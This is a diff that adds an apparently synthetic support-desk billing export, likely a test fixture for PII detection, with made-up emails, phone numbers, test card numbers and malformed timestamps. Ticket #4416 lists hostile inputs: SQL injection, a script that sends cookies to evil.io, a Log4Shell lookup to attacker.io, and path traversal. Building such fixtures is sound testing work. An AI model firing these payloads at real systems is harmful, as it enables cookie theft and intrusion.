@@ -1,0 +1,123 @@
+
+=====================================================================
+SUPPORT DESK EXPORT - BILLING & ACCOUNTS
+Generated 2026-09-04 | Records 4412-4488 | UNVERIFIED RAW DUMP
+=====================================================================
+
+[TICKET #4412] status=open
+From: d.niyonsenga@alueducation.com
+Subject: Cannot access portal
+
+Hi team, I have been locked out since 9:15 AM this morning. I tried
+again at 11:40 am and at 2:05 PM with no luck. Please call me on
+0788 123 456 or my second line 0722-987-654.
+Backup contact: digne.n@alumni.alueducation.com
+
+--- agent note ---
+Called client 3:20 pm. No answer. Retried 4:45 PM, reached him.
+Verified card on file ending 0366 (full: 4532 0151 1283 0366).
+Ticket ref TKT-88213. Do NOT paste card into chat again.
+
+
+[TICKET #4413] status=closed
+From: k.uwase@si.alueducation.com
+Phone: +250788456789
+Alt: 0733 221 100
+
+Payment failed twice. Client re-entered card 4111111111111111 at
+10:30 AM, then again 10:31 am. Third attempt 12:02 PM succeeded with
+4539 1488 0343 6467.
+Tracking reference: 45391488034364679921  <-- NOT a card, 20 digits
+Batch ID: 5500005555555559-BATCH-A
+
+
+[TICKET #4414] status=escalated
+From: support@alu.co.rw
+CC: billing@example.com, ops@sub.domain.example.co.rw
+
+Client called at 25:99 (bad timestamp from legacy logger, ignore)
+Real callback slot: 1:00 pm - 2:30 pm.
+Reachable on 0788123456 / +250 733 445 566 / 0725.667.889
+
+Malformed entries found in import:
+  notanemail@
+  @alueducation.com
+  plain.text.no.at.sign
+  double@@at.com
+  trailing.dot@example.
+  fake@alueducation.com.evil-domain.net
+  spoof@alumni.alueducation.com.attacker.io
+
+
+[TICKET #4415] status=open
+From: j.mugisha@alumni.alueducation.com
+Phone: 0788-999-000
+
+"Reset link expired at 7:5 (logger truncated). Tried again 07:05 AM
+and 7:05 pm same day."
+
+Cards attempted:
+  6011 1111 1111 1117   -> declined
+  3782 822463 10005     -> amex, 15 digits, declined
+  1234 5678 9012 3456   -> passes shape check, INVALID card
+  0000000000000000      -> passes shape check, INVALID card
+
+
+[TICKET #4416] status=open  ** FLAGGED: SUSPICIOUS INPUT **
+From: admin@si.alueducation.com
+
+Client pasted the following into the description field:
+
+  '; DROP TABLE users; --
+  <script>fetch('http://evil.io/x?c='+document.cookie)</script>
+  {{7*7}}
+  ../../../../etc/passwd
+  javascript:alert(document.domain)
+  <img src=x onerror=alert(1)>
+  admin@alueducation.com'--
+  ${jndi:ldap://attacker.io/a}
+
+Do not render this field anywhere. Treat as untrusted.
+Contact for follow-up: s.habimana@alueducation.com, 0788 111 222
+
+
+[TICKET #4417] status=open
+From: p.ingabire@gmail.com   (personal, not ALU)
+Phone: 0788 000 111
+
+Meeting moved from 9:00 AM to 10:30 am, then finally 12:45 PM.
+Vendor call at 1:15 pm. Wrap-up 5:59 PM.
+Invalid stamps in log: 13:00 PM, 0:30 AM, 14:99 PM, 99:99
+
+Refund to card 5555 5555 5555 4444.
+Internal ledger row: 555555555555444400712 (ledger id, not a card)
+
+
+[TICKET #4418] status=open
+From: MIXED-CASE@ALUEDUCATION.COM
+Phone: +250-788-334-556
+
+Please merge with ticket TKT-40012.
+Secondary emails on file:
+  a.keza@alueducation.com
+  a.keza+billing@alueducation.com
+  a_keza99@alumni.alueducation.com
+  a-keza@si.alueducation.com
+  a.keza@alueducation.co        <-- wrong TLD
+  a.keza@alu-education.com      <-- wrong domain
+
+Callback 8:00 am or 8:00 pm, client did not specify which.
+Card ending 4444 already on file, do not re-request.
+
+
+[TICKET #4419] status=closed
+From: noreply@vendor-portal.example.com
+
+Automated: payment of RWF 45,000 processed 11:59 PM.
+Card 4532015112830366 charged. Auth code A88213.
+Next retry window 12:00 AM - 6:00 am.
+Support line 0788 445 667 (Rwanda), ext 4417.
+
+=====================================================================
+END OF EXPORT - 8 records - contains PII - handle per policy
+=====================================================================
